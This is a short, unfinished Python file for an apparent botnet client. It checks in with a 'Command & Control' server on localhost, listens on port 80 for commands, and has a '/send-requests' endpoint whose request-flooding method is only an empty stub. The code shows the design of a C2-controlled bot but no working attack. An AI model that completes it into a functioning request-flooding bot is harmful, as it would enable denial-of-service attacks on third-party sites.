from http.server import BaseHTTPRequestHandler, HTTPServer

import requests
import socket
import json


class Bot(BaseHTTPRequestHandler):

    def do_GET(self):
        if self.path == '/info': # TODO con platform
            pass
        elif self.path == '/status':
            self.send_response(200)
        else:
            self.send_response(404)
        self.end_headers()

    def do_POST(self):
        if self.path == '/send-requests':
            self.send_requests(0, 0)

    def send_requests(self, url, n):
        for _ in range(n):
            pass


CNC_ADDR = "127.0.0.1"
CNC_PORT = 60000


def exit_handler():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((CNC_ADDR, CNC_PORT))
        s.send(b"close")
        print("Connection closed")


if __name__ == '__main__':
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((CNC_ADDR, CNC_PORT))
        s.send(b"new")
        print("Connected to the Command & Control")

    bot = HTTPServer(('127.0.0.1', 80), Bot)

    try:
        bot.serve_forever()
    except KeyboardInterrupt:
        exit_handler()
